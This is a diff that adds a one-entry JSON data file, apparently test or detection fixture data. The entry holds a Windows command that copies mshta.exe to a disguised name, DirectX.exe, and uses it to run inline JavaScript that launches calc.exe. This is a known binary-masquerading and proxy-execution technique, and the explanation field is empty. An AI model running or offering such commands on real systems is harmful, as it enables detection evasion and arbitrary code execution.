@@ -1,0 +1,6 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\mshta.exe C:\\Windows\\DirectX.exe && C:\\Windows\\DirectX.exe javascript:a=(new ActiveXObject('WScript.Shell')).Run('calc.exe');window.close();",
+    "explanation": ""
+  }
+]
